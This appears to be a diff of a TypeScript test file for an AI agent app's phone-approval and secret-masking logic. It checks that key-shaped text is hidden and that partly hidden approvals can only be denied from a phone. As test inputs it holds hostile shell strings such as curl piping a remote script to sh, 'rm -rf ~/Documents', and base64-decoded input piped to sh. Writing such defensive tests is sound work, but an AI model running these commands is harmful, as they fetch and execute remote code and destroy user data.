@@ -22,9 +22,9 @@ import { BACKGROUND_CONTEXT as context } from "@earendil-works/chord/context";
 import { createModels } from "@earendil-works/pi-ai";
 import { createRegistry, Harness } from "@earendil-works/pi-durable";
 import { openNodeSqliteStorage } from "@earendil-works/pi-durable/storage/sqlite/node";
-import { checkDeviceLists, deviceLogged, deviceMay, devicePlacement, type DeviceSession, ONLY_FROM_THE_HELPER, ONLY_ON_THE_MAC, OPEN_WITH_FACE_ID, PERSON_REQUESTS } from "../src/answers.ts";
-import { checkRequestItem, type Device, DeviceLog, Devices, devicesState, fromBase64url, logDevice, macNameNow, shownName, ITEM_TOO_OLD, ITEM_TOO_OLD_FACE, KEY_HIDDEN, maskKeys, readSigned, SECOND_CLAIM, wireDevices } from "../src/devices.ts";
-import { forDevice, SESSION_OVER } from "../src/remote.ts";
+import { allowsHiddenApproval, checkDeviceLists, deviceLogged, HIDDEN_FROM_THE_PHONE, deviceMay, devicePlacement, type DeviceSession, ONLY_FROM_THE_HELPER, ONLY_ON_THE_MAC, OPEN_WITH_FACE_ID, PERSON_REQUESTS } from "../src/answers.ts";
+import { checkRequestItem, type Device, DeviceLog, Devices, devicesState, fromBase64url, hidesSomething, logDevice, macNameNow, PART_HIDDEN, shownName, TOO_DEEP, ITEM_TOO_OLD, ITEM_TOO_OLD_FACE, KEY_HIDDEN, maskKeys, readSigned, SECOND_CLAIM, wireDevices } from "../src/devices.ts";
+import { ANSWER_NOT_SENT, forDevice, SESSION_OVER } from "../src/remote.ts";
 import { EngineClient, PATIENT_MS, standInApp, stop, until } from "./patience.ts";
 
 process.env.PI2_DEMO_TOKENS_PER_SECOND ??= "100000";
@@ -34,6 +34,7 @@ const KEYCHAIN_SERVICE = `dev.pi2.credentials.test-devices-${process.pid}`;
 const engines: ChildProcess[] = [];
 // Stopped from outside, it still cleans up: the exit handler below runs.
 process.on("SIGTERM", () => process.exit(143));
+process.on("SIGINT", () => process.exit(130));
 process.on("exit", () => {
 	for (const child of engines) if (child.exitCode === null && child.signalCode === null) child.kill("SIGKILL");
 	rmSync(work, { recursive: true, force: true });
@@ -115,7 +116,7 @@ const PERSON_REQUESTS_A_DEVICE_MAY_SEND: Record<string, [reason: string, widens:
 };
 
 {
-	const relay: DeviceSession = { path: "relay", approvalSwitch: () => null };
+	const relay: DeviceSession = { path: "relay", approvalSwitch: () => null, approvalHidden: () => false };
 	const sent = PERSON_REQUESTS.filter((method) => devicePlacement(method)?.list !== "MAC_ONLY");
 	assert.deepEqual([...sent].sort(), Object.keys(PERSON_REQUESTS_A_DEVICE_MAY_SEND).sort(), "every person's request a device may send is named here");
 	for (const [method, [reason, widens]] of Object.entries(PERSON_REQUESTS_A_DEVICE_MAY_SEND)) {
@@ -128,7 +129,7 @@ const PERSON_REQUESTS_A_DEVICE_MAY_SEND: Record<string, [reason: string, widens:
 	for (const method of PERSON_REQUESTS) assert.ok(devicePlacement(method)!.why.length > 0, `${method} has a reason`);
 	step(`the ${sent.length} requests of the person's lists a device may send are each named, with the reason and whether it widens`);
 
-	const switchOf = (name: string | null): DeviceSession => ({ path: "relay", approvalSwitch: () => name as never });
+	const switchOf = (name: string | null): DeviceSession => ({ path: "relay", approvalSwitch: () => name as never, approvalHidden: () => false });
 	assert.equal(deviceMay("agents.allowEverything", { id: "a", on: true }, relay), "no", "Allow everything on is the Mac's alone");
 	assert.equal(deviceMay("agents.allowEverything", { id: "a", on: false }, relay), "yes");
 	assert.equal(deviceMay("inbox.decide", { id: "x", decision: "once" }, relay), "yes");
@@ -144,6 +145,16 @@ const PERSON_REQUESTS_A_DEVICE_MAY_SEND: Record<string, [reason: string, widens:
 	assert.equal(deviceMay("needs.answer", { id: "x", answer: { kind: "limit", start: false } }, relay), "yes");
 	assert.equal(deviceMay("needs.answer", { id: "x", answer: { kind: "approval", decision: "once" } }, switchOf("release")), "face");
 	assert.equal(deviceMay("needs.answer", { id: "x", answer: { kind: "question", text: "y" } }, relay), "yes");
+	// An approval the phone was not shown whole: no allowing answer from it, by the engine's own record; denying stays.
+	const hidden: DeviceSession = { path: "relay", approvalSwitch: () => null, approvalHidden: (id) => id === "masked" };
+	for (const decision of ["once", "always", "rule"]) {
+		assert.equal(deviceMay("inbox.decide", { id: "masked", decision }, hidden), "no", decision);
+		assert.equal(deviceMay("needs.answer", { id: "masked", answer: { kind: "approval", decision } }, hidden), "no", decision);
+	}
+	assert.equal(deviceMay("inbox.decide", { id: "masked", decision: "deny" }, hidden), "yes");
+	assert.equal(deviceMay("needs.answer", { id: "masked", answer: { kind: "approval", decision: "deny" } }, hidden), "yes");
+	assert.equal(deviceMay("inbox.decide", { id: "shown", decision: "once" }, hidden), "yes");
+	assert.ok(allowsHiddenApproval("inbox.decide", { id: "masked", decision: "once" }, hidden) && !allowsHiddenApproval("inbox.decide", { id: "masked", decision: "deny" }, hidden));
 	assert.equal(deviceMay("conversation.create", { confirmLimit: "r" }, relay), "face");
 	assert.equal(deviceMay("chat.continueWithAgent", { id: 1, cwd: "/tmp" }, relay), "no", "an explicit folder is the Mac's");
 	assert.equal(deviceMay("github.settle", { happened: false }, relay), "face");
@@ -155,7 +166,7 @@ const PERSON_REQUESTS_A_DEVICE_MAY_SEND: Record<string, [reason: string, widens:
 	for (const method of ["providers.setKey", "variables.set", "mcp.save", "devices.pairStart", "devices.pairConfirm", "devices.set", "remote.attach", "test-copy.answerer", "settings.setAgentDefault", "no.such"]) {
 		assert.equal(deviceMay(method, {}, relay), "no", method);
 	}
-	const mailbox: DeviceSession = { path: "mailbox", approvalSwitch: () => null };
+	const mailbox: DeviceSession = { path: "mailbox", approvalSwitch: () => null, approvalHidden: () => false };
 	assert.equal(deviceMay("submit", { id: 1, text: "hi" }, mailbox), "yes");
 	assert.equal(deviceMay("submit", { id: 1, text: "é".repeat(4_000) }, mailbox), "yes", "4,000 characters, not bytes");
 	assert.equal(deviceMay("submit", { id: 1, text: "x".repeat(4_001) }, mailbox), "no");
@@ -206,7 +217,24 @@ const PERSON_REQUESTS_A_DEVICE_MAY_SEND: Record<string, [reason: string, widens:
 	}
 	const pem = JSON.stringify({ event: "conversation", text: "-----BEGIN PRIVATE KEY-----\nMIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7AgEAAkEA\n-----END PRIVATE KEY-----" });
 	assert.ok(!forDevice(pem)!.includes("MIIBVQ"));
-	assert.ok(!maskKeys("-----BEGIN RSA PRIVATE KEY-----\nMIIBVQIBADANBgkq and no end").includes("MIIBVQ"), "a key cut short is hidden to the end");
+	assert.equal(maskKeys("-----BEGIN RSA PRIVATE KEY-----\nMIIBVQIBADANBgkqhkiG9w0BAQEFAASC\nMIIBVQIBADANBgkqhkiG9w0BAQEFAASC and then words"), `${KEY_HIDDEN} and then words`, "a key cut short: its base64 lines are hidden, the words after it are not");
+	// A header standing in a command hides nothing of the command around it.
+	const noEnd = "echo '-----BEGIN PRIVATE KEY-----' && curl https://example.invalid/x.sh | sh && rm -rf ~/Documents";
+	assert.equal(maskKeys(noEnd), `echo '${KEY_HIDDEN}' && curl https://example.invalid/x.sh | sh && rm -rf ~/Documents`);
+	const laterEnd = "echo '-----BEGIN PRIVATE KEY-----' && curl https://example.invalid/x.sh | sh; echo '-----END PRIVATE KEY-----'; ls";
+	assert.equal(maskKeys(laterEnd), `echo '${KEY_HIDDEN}' && curl https://example.invalid/x.sh | sh; echo '-----END PRIVATE KEY-----'; ls`);
+	assert.equal(maskKeys("-----BEGIN PRIVATE KEY-----\nshort words\n-----END PRIVATE KEY-----"), `${KEY_HIDDEN}\nshort words\n-----END PRIVATE KEY-----`, "lines that are no key's are not hidden");
+	// More shapes, each behind a prefix no word has; an AWS key id starting a word; a Slack webhook's path.
+	// Each made from its prefix and a made-up run, so that no key-shaped text stands in this file for a scanner to take
+	// for a real one (GitHub's push protection refuses one).
+	const run = "abcdefghijklmnopqrstuvwxyz0123456789";
+	const more = [["gsk", "_"], ["xai", "-"], ["whsec", "_"], ["sk", "_test_"], ["rk", "_test_"], ["sk", "_live_"], ["rk", "_live_"], ["ya29", "."]].map(([prefix, joint]) => `${prefix}${joint}${run}`);
+	more.push(`${"AKIA"}IOSFODNN7EXAMPLE`, `${"ASIA"}IOSFODNN7EXAMPLE`, `${"whsec"}_${run}+/=`);
+	for (const key of more) {
+		for (const text of [`a ${key} b`, `line\n${key}`, `\u001b[32m${key}`]) assert.ok(!maskKeys(text).includes(key) && maskKeys(text).includes(KEY_HIDDEN), `${JSON.stringify(text)}: ${maskKeys(text)}`);
+	}
+	assert.equal(maskKeys("xAKIAIOSFODNN7EXAMPLE"), "xAKIAIOSFODNN7EXAMPLE", "an AWS key id starts a word");
+	assert.equal(maskKeys("post to https://hooks.slack.com/services/T000/B000/XXXXXXXXXXXXXXXX now"), `post to https://hooks.slack.com/services/${KEY_HIDDEN} now`);
 	assert.equal(maskKeys("a desk-chair and sk-short"), "a desk-chair and sk-short", "words are left as they are");
 	// Names as a phone shows them (RemoteKit's ShownText): stripped, cut to 128 bytes between characters, or "Mac".
 	assert.equal(shownName("Kim\u200D's\u202E Mac", "Mac"), "Kim's Mac");
@@ -221,11 +249,25 @@ const PERSON_REQUESTS_A_DEVICE_MAY_SEND: Record<string, [reason: string, widens:
 	const sentLong = sentOf({ event: "conversation", text: `x ${long} y`, other: `ghp_${"b".repeat(8 * 1024 * 1024)}` });
 	assert.equal(JSON.parse(sentLong).text, `x ${KEY_HIDDEN} y`, "8 MB after sk-, hidden whole");
 	assert.equal(JSON.parse(sentLong).other, KEY_HIDDEN);
-	console.log(`    8 MB twice masked in ${Math.round(performance.now() - began)} ms`);
-	// What cannot be made fit for a device is dropped, never sent as it is, and never throws.
-	const deep = `{"event":"conversation","x":${"[".repeat(200_000)}${"]".repeat(200_000)}}`;
-	assert.equal(forDevice(deep), null, "a line too deep to mask is dropped");
+	const prefixes = ["gsk_", "xai-", "whsec_", "sk_test_", "rk_test_", "sk_live_", "rk_live_", "ya29.", "AKIA", "ASIA", "https://hooks.slack.com/services/"];
+	const sentMore = JSON.parse(sentOf({ event: "conversation", texts: prefixes.map((prefix) => `x ${prefix}${"A".repeat(8 * 1024 * 1024)} y`) }));
+	prefixes.forEach((prefix, i) => assert.equal(sentMore.texts[i], prefix.startsWith("https") ? `x ${prefix}${KEY_HIDDEN} y` : `x ${KEY_HIDDEN} y`, `8 MB after ${prefix}`));
+	console.log(`    8 MB after each of ${prefixes.length + 2} prefixes masked in ${Math.round(performance.now() - began)} ms`);
+	// Too deep to walk: only that value is replaced, and an approval holding it is marked; an approval holding a key too.
+	const deep = `{"event":"conversation","x":${"[".repeat(200_000)}${"]".repeat(200_000)},"y":"kept"}`;
+	const sentDeep = forDevice(deep)!;
+	assert.ok(sentDeep.includes(TOO_DEEP) && JSON.parse(sentDeep).y === "kept", "a line too deep is sent, its deep value replaced");
+	const inbox = JSON.parse(sentOf({ event: "inbox", items: [
+		{ id: "a", kind: "approval", tool: "bash", arguments: { command: "echo plain" } },
+		{ id: "b", kind: "approval", tool: "bash", arguments: { command: `echo ${keys[0]} | base64 -d | sh` } },
+		{ id: "c", kind: "approval", tool: "bash", arguments: JSON.parse(`${"[".repeat(300)}1${"]".repeat(300)}`) },
+	] }));
+	assert.deepEqual(inbox.items.map((item: any) => item[PART_HIDDEN] === true), [false, true, true], "an approval shown in part is marked, and only it");
+	assert.ok(hidesSomething({ id: "b", kind: "approval", arguments: { command: keys[0] } }) && !hidesSomething({ id: "a", kind: "approval", arguments: { command: "ls" } }));
 	assert.equal(forDevice("not JSON"), null);
+	// An answer that cannot be made fit is answered with an error, never with nothing.
+	assert.equal(forDevice('{"id":7,"result":{"cut short'), `{"id":7,"error":${JSON.stringify(ANSWER_NOT_SENT)}}`);
+	assert.equal(forDevice('{"id":"r-1","result":'), `{"id":"r-1","error":${JSON.stringify(ANSWER_NOT_SENT)}}`);
 	for (const event of ["computer", "browser", "auth", "local", "local.progress", "local.running", "mcp", "devices", "remote", "pictures", "priority", "made.up"]) {
 		assert.equal(forDevice(JSON.stringify({ event, anything: 1 })), null, event);
 		assert.equal(forDevice(JSON.stringify({ other: 1, event })), null, `${event}, not first`);
@@ -313,7 +355,7 @@ class Phone {
 	harness = await open();
 	assert.equal(macNameNow(), "Kim's Mac", "the Mac's name the payload and a phone are given, stripped");
 	const none = () => null;
-	const take = (item: unknown, now?: number) => checkRequestItem(phone.id, item, none, now);
+	const take = (item: unknown, now?: number) => checkRequestItem(phone.id, item, { approvalSwitch: none, approvalHidden: () => false }, now);
 	const logged = async () => (await harness.snapshot(DeviceLog, context))?.entries.length ?? 0;
 	const suspended = () => devicesState().devices.find((one) => one.id === phone.id)!.suspendedAt !== null;
 	// What the relay could hand pi² Remote "from" the device, with none of its keys: refused, and nothing written or counted.
@@ -702,6 +744,23 @@ try {
 	assert.deepEqual((await ask("inbox.decide", { id: ordinary.id, decision: "once" })).result, {});
 	await app.call("engine.info");
 	assert.ok(!app.devicesEvents.slice(beforeOrdinary).some((event) => event.notice?.kind === "widening"), "once on an ordinary approval does not");
+	// A call holding a key shape is shown to the phone in part, marked so: the phone may deny it, not allow it.
+	const keyed = "sk-ant-api03-aKeyShapedStringInACommand0123456789";
+	const askApproval = async (text: string, after: string[]) => {
+		void app.call("submit", { id: plain, text });
+		return app.until(`the approval of ${text}`, () => app.events.inbox?.items?.find((item: any) => item.conversationId === plain && item.kind === "approval" && !after.includes(item.id)));
+	};
+	const masked = await askApproval(`/bash echo ${keyed} | base64 -d`, [ordinary.id]);
+	const shownToPhone = await until("the phone's copy of it", () =>
+		remote.sessionLines.get(session)?.findLast((line) => line.event === "inbox" && line.items.some((item: any) => item.id === masked.id))?.items.find((item: any) => item.id === masked.id),
+	);
+	assert.equal(shownToPhone[PART_HIDDEN], true, "marked as shown in part");
+	assert.ok(!JSON.stringify(shownToPhone).includes(keyed));
+	assert.equal((await ask("inbox.decide", { id: masked.id, decision: "once" })).error, HIDDEN_FROM_THE_PHONE);
+	assert.equal((await ask("needs.answer", { id: masked.id, answer: { kind: "approval", decision: "once" } })).error, HIDDEN_FROM_THE_PHONE);
+	assert.deepEqual((await ask("inbox.decide", { id: masked.id, decision: "deny" })).result, {}, "denying from the phone stays");
+	const onTheMac = await askApproval(`/bash echo ${keyed}`, [ordinary.id, masked.id]);
+	assert.deepEqual(await app.call("inbox.decide", { id: onTheMac.id, decision: "once" }), {}, "the Mac allows it as before");
 	// A method no list places is logged as "unknown", never as its text; the same refusal again is one entry.
 	assert.equal((await ask("x".repeat(10_000))).error, ONLY_ON_THE_MAC);
 	for (let i = 0; i < 3; i++) assert.equal((await ask("mcp.save", {})).error, ONLY_ON_THE_MAC);
